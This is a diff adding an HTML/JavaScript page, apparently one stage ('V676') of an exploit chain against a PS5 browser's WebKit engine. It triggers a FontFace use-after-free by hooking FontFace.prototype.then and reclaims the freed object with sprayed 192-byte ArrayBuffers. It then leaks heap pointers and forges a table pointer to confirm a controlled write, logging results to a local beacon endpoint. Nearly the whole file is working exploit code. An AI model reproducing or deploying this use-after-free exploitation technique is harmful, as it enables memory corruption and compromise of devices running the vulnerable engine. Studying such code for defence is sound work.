@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V676</title></head>
+<body><pre id="out">V676 — Two-phase FontFace addClient forge (p656 port) + p564 templating</pre>
+<script>
+'use strict';
+/*
+ * V676 — TWO-PHASE FONTFACE FORGE (next stage after V675)
+ *
+ * Direct port of PS5-14.10-Research p656 (two-phase addClient forge, device
+ * CONFIRMED on their bench) with the V675 infrastructure: p564 buffer
+ * templating for process survival, crash-loop breaker, release-at-DONE,
+ * sync-XHR POST beacons (host.py), rotating family names.
+ *
+ * REPLACES the dead V650 forged-stateStack read: that mechanism crashed 5+
+ * times on this bench and repo 2's P682 on both firmwares. The two-phase
+ * FontFace forge stays inside the bug family that works on this bench.
+ *
+ * MECHANISM (p656): addClient writes during initializeWrapper (trap
+ * continuation), NOT during the destructor. If +0x58 (m_table) is non-null
+ * in the spray, HashSet::add() uses the existing table pointer instead of
+ * allocating a new one.
+ *   Phase 1: UAF -> spray 192B with +0x58=0 -> engine allocates T1 -> read T1
+ *   Phase 2: second UAF -> spray 192B with +0x58=T1 -> addClient inserts
+ *            into T1's table. If +0x58 still == T1 after continuation,
+ *            FORGE CONFIRMED (rc=seed+1, W2 written, no crash).
+ *
+ * ALSO ENABLED (p599 v4i): the two-phase redirect is a controlled-read
+ * oracle -- removeClient reads 8 qwords from whatever +0x58 points to;
+ * the only observable is survive (benign) vs crash (hostile).
+ *
+ * CONSTRAINTS (repo 2 docs): short family names; one FontFace UAF hit per
+ * WebProcess -- close the guide app after any hit.
+ * CRASH_CLASS: HIGH. Beacons are sync XHR POSTs to host-beacons.log.
+ *
+ * Params: ?reset=1 clears crash/session markers. ?spray=N buffers per phase
+ * (default 80, p656 value). HALT: 5 crashed runs in 2 min -> 2 min pause.
+ */
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/beacon/V676-'+encodeURIComponent(tag)+'?t='+Date.now(),false);
+    x.send(String(d==null?'':d).slice(0,700));
+  }catch(e){}
+}
+window.onerror=function(m){bk('ERR',String(m).slice(0,200));say('ERR '+m);};
+function hex32(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
+function qHex(hi,lo){return '0x'+hex32(hi)+hex32(lo);}
+
+var P=new URLSearchParams(location.search);
+var NSPRAY=+(P.get('spray')||'80');
+if(P.get('reset')==='1'){
+  try{
+    localStorage.removeItem('v675sess');localStorage.removeItem('v675done');
+    localStorage.removeItem('v675run');localStorage.removeItem('v675x');
+    localStorage.removeItem('v676sess');localStorage.removeItem('v676done');
+    localStorage.removeItem('v676run');
+  }catch(e){}
+}
+
+var RUN=1;
+try{RUN=(parseInt(localStorage.getItem('v676run'),10)||0)+1;}catch(e){}
+try{localStorage.setItem('v676run',String(RUN));}catch(e){}
+
+/* crash-loop breaker (time-boxed, same logic as V675 v4) */
+var HALT=false,sess={c:0,t:0},doneTs=0;
+try{var sj=JSON.parse(localStorage.getItem('v676sess')||'null');if(sj&&typeof sj.c==='number')sess=sj;}catch(e){}
+try{doneTs=+(localStorage.getItem('v676done')||0);}catch(e){}
+var nowBoot=Date.now();
+if(sess.t===0)sess.c=0;
+else if(sess.t>doneTs)sess.c++;
+else sess.c=0;
+if(sess.c>=5&&(nowBoot-sess.t)<120000)HALT=true;
+if(!HALT){sess.t=nowBoot;try{localStorage.setItem('v676sess',JSON.stringify(sess));}catch(e){}}
+
+bk('BOOT','run='+RUN+',spray='+NSPRAY+',crashes='+sess.c+(HALT?',HALT':''));
+say('BOOT run='+RUN+' spray='+NSPRAY+' crashes='+sess.c);
+
+var phase=0,bufs1=[],bufs2=[],T1_lo=0,T1_hi=0,W1_lo=0,W1_hi=0;
+var sty2=null,ffB=null,p2EarlyDone=false;
+var FAM_A='fa-'+RUN,FAM_SA='sa-'+RUN,FAM_B='fb-'+RUN,FAM_SB='sb-'+RUN;
+
+if(HALT){
+  bk('HALT','crash-loop-breaker after '+sess.c+' crashed runs');
+  say('HALT: '+sess.c+' crashed runs. Wait 2 min or ?reset=1.');
+}else{
+  runPhase1();
+}
+
+function emit(tag,msg){
+  var s=tag+(msg?' '+msg:'');
+  say(s);
+  bk(tag,msg||'');
+}
+
+function runPhase1(){
+  /* Phase 1 CSS face (style) + JS face */
+  var sty1=document.createElement('style');
+  sty1.textContent="@font-face { font-family: "+FAM_SA+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty1);
+  var ffA=new FontFace(FAM_A,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ffA);
+  void ffA.loaded;
+
+  /* Unified trap (p656 structure) */
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(phase===1){
+        phase=0;
+        sty1.remove();
+        document.body.offsetHeight;
+        for(var i=0;i<NSPRAY;i++){
+          var ab=new ArrayBuffer(192);
+          var dv=new DataView(ab);
+          dv.setUint32(0x00,2,true);         // seed rc=2
+          dv.setUint32(0x04,0xAAAA0001,true); // P1 marker
+          // +0x58 stays 0 -> addClient allocates fresh table T1
+          bufs1.push({ab:ab,dv:dv});
+        }
+        emit('TRAP1','spray='+bufs1.length);
+        return undefined;
+      }
+      if(phase===2){
+        phase=0;
+        sty2.remove();
+        document.body.offsetHeight;
+        for(var j=0;j<NSPRAY;j++){
+          var ab2=new ArrayBuffer(192);
+          var dv2=new DataView(ab2);
+          dv2.setUint32(0x00,5,true);         // seed rc=5
+          dv2.setUint32(0x04,0xBBBB0002,true); // P2 marker
+          dv2.setUint32(0x58,T1_lo,true);      // FORGE: use Phase 1's table
+          dv2.setUint32(0x5C,T1_hi,true);
+          bufs2.push({ab:ab2,dv:dv2});
+        }
+        emit('TRAP2','spray='+bufs2.length+' forge=T1='+qHex(T1_hi,T1_lo));
+        return undefined;
+      }
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  phase=1;
+  document.fonts.load('1em '+FAM_A+', '+FAM_SA,'AB');
+  emit('P1-LOAD','fonts.load sent');
+  setTimeout(analyzePhase1,100);
+}
+
+function template(bufs,tLo,tHi,wLo,wHi){
+  /* p564 survival: write rc=1 + leaked +0x58/+0x68 back into every 192B
+   * buffer so the engine's continued use of the stale face doesn't crash */
+  for(var k=0;k<bufs.length;k++){
+    var bv=new Uint8Array(bufs[k].ab);
+    bv[0]=1;bv[1]=0;bv[2]=0;bv[3]=0;
+    bv[4]=0;bv[5]=0;bv[6]=0;bv[7]=0;
+    var dv=bufs[k].dv;
+    dv.setUint32(0x58,tLo,true);dv.setUint32(0x5C,tHi,true);
+    dv.setUint32(0x68,wLo,true);dv.setUint32(0x6C,wHi,true);
+  }
+}
+
+function analyzePhase1(){
+  try{
+    var hit1=-1;
+    for(var i=0;i<bufs1.length;i++){
+      if(bufs1[i].dv.getUint32(0,true)!==2){hit1=i;break;}
+    }
+    if(hit1<0){
+      for(var j=0;j<bufs1.length;j++){
+        if(bufs1[j].dv.getUint32(0x58,true)!==0||bufs1[j].dv.getUint32(0x5C,true)!==0){hit1=j;break;}
+      }
+    }
+    if(hit1<0){emit('P1-MISS','no reclaim');finish('p1-miss');return;}
+
+    var dv1=bufs1[hit1].dv;
+    var rc1=dv1.getUint32(0x00,true);
+    T1_lo=dv1.getUint32(0x58,true);
+    T1_hi=dv1.getUint32(0x5C,true);
+    W1_lo=dv1.getUint32(0x68,true);
+    W1_hi=dv1.getUint32(0x6C,true);
+    emit('P1-HIT','hit='+hit1+' rc='+rc1);
+    emit('P1-TW','T1='+qHex(T1_hi,T1_lo)+' W1='+qHex(W1_hi,W1_lo));
+    if(T1_lo===0&&T1_hi===0){emit('P1-FAIL','T1 null -- engine wrote no table ptr');finish('p1-fail');return;}
+
+    /* p564 survival templating BEFORE Phase 2 */
+    template(bufs1,T1_lo,T1_hi,W1_lo,W1_hi);
+    emit('P1-TEMPLATE','192B x'+bufs1.length+' rc=1 restored');
+    window.__p1dv=dv1;
+
+    /* Phase 2 setup: fresh family + JS face */
+    sty2=document.createElement('style');
+    sty2.textContent="@font-face { font-family: "+FAM_SB+"; src: local(Arial); unicode-range: U+0043; }";
+    document.head.appendChild(sty2);
+    ffB=new FontFace(FAM_B,'local(Helvetica)',{unicodeRange:'U+0044'});
+    document.fonts.add(ffB);
+    void ffB.loaded;
+
+    phase=2;
+    document.fonts.load('1em '+FAM_B+', '+FAM_SB,'CD').then(
+      function(){emit('P2-RESOLVED','load promise resolved');},
+      function(){emit('P2-REJECTED','load promise rejected');});
+    emit('P2-TRIGGER','fonts.load sent (forge +0x58=T1)');
+    /* Early P2 instrumentation: addClient writes during initializeWrapper
+     * (trap continuation), which can be much earlier than P1's ~80ms.
+     * Catch partial writes before any crash so we know whether P2 dies
+     * DURING addClient's insertion into the forged table or before it. */
+    try{Promise.resolve().then(scanP2Early);}catch(e){}
+    setTimeout(scanP2Early,30);
+    setTimeout(scanP2Early,60);
+    setTimeout(analyzePhase2,150);
+  }catch(e1){emit('P1-FATAL',String(e1).slice(0,200));finish('p1-fatal');}
+}
+
+function scanP2Early(){
+  if(p2EarlyDone)return;
+  for(var i=0;i<bufs2.length;i++){
+    var dv=bufs2[i].dv;
+    var rc=dv.getUint32(0x00,true);
+    var f58lo=dv.getUint32(0x58,true),f58hi=dv.getUint32(0x5C,true);
+    var w2lo=dv.getUint32(0x68,true),w2hi=dv.getUint32(0x6C,true);
+    if(rc!==5||f58lo!==T1_lo||f58hi!==T1_hi||w2lo!==0||w2hi!==0){
+      p2EarlyDone=true;
+      emit('P2-EARLY','i='+i+' rc='+rc+' +0x58='+qHex(f58hi,f58lo)+' (T1='+qHex(T1_hi,T1_lo)+') W2='+qHex(w2hi,w2lo)+' t='+(Date.now()%100000));
+      return;
+    }
+  }
+}
+
+function analyzePhase2(){
+  try{
+    var hit2=-1;
+    for(var i=0;i<bufs2.length;i++){
+      if(bufs2[i].dv.getUint32(0,true)!==5){hit2=i;break;}
+    }
+    if(hit2<0){
+      for(var j=0;j<bufs2.length;j++){
+        if(bufs2[j].dv.getUint32(0x68,true)!==0||bufs2[j].dv.getUint32(0x6C,true)!==0){hit2=j;break;}
+      }
+    }
+    if(hit2<0){
+      emit('P2-MISS','no reclaim in Phase 2');
+      emit('P2-DIAG','bufs2='+bufs2.length+' phase='+phase);
+      finish('p2-miss');return;
+    }
+
+    var dv2=bufs2[hit2].dv;
+    var rc2=dv2.getUint32(0x00,true);
+    var mk2=dv2.getUint32(0x04,true);
+    var f58_lo=dv2.getUint32(0x58,true);
+    var f58_hi=dv2.getUint32(0x5C,true);
+    var W2_lo=dv2.getUint32(0x68,true);
+    var W2_hi=dv2.getUint32(0x6C,true);
+    var st85=dv2.getUint8(0x85);
+
+    emit('P2-HIT','hit='+hit2+' rc='+rc2+' mark=0x'+hex32(mk2));
+    emit('P2-58','final +0x58='+qHex(f58_hi,f58_lo));
+    emit('P2-W2','W2='+qHex(W2_hi,W2_lo)+' +85=0x'+st85.toString(16));
+
+    var forgeHeld=(f58_lo===T1_lo&&f58_hi===T1_hi);
+    if(forgeHeld){
+      emit('FORGE','*** CONFIRMED *** +0x58 == T1 -- addClient used forged table!');
+      var engineRan=(W2_lo!==0||W2_hi!==0);
+      emit('ENGINE','W2 written='+engineRan+' rc=seed+1='+(rc2===6));
+      /* p564 survival for Phase 2 as well */
+      template(bufs2,f58_lo,f58_hi,W2_lo,W2_hi);
+      emit('P2-TEMPLATE','192B x'+bufs2.length);
+      var rc1_now=window.__p1dv?window.__p1dv.getUint32(0x00,true):-1;
+      var p1_58_lo=window.__p1dv?window.__p1dv.getUint32(0x58,true):0;
+      var p1_58_hi=window.__p1dv?window.__p1dv.getUint32(0x5C,true):0;
+      emit('P1-POST','rc1='+rc1_now+' +0x58='+qHex(p1_58_hi,p1_58_lo));
+      finish('forge-confirmed');
+    }else{
+      emit('FORGE','FAILED -- engine overwrote +0x58');
+      emit('FORGE-DIFF','expected='+qHex(T1_hi,T1_lo)+' got='+qHex(f58_hi,f58_lo));
+      var looksLikeT2=(f58_hi>=0x00000010&&f58_hi<0x00001000);
+      emit('T2-CHECK','looks-like-heap='+looksLikeT2);
+      finish('forge-failed');
+    }
+  }catch(e2){emit('P2-FATAL',String(e2).slice(0,200));finish('p2-fatal');}
+}
+
+function finish(m){
+  try{
+    bufs1.length=0;bufs2.length=0;
+    window.__keep=null;window.__p1dv=null;
+    try{delete FontFace.prototype.then;}catch(e){}
+    localStorage.setItem('v676done',String(Date.now()));
+  }catch(e){}
+  bk('DONE',m);
+  say('V676 complete: '+m);
+}
+</script>
+</body>
+</html>
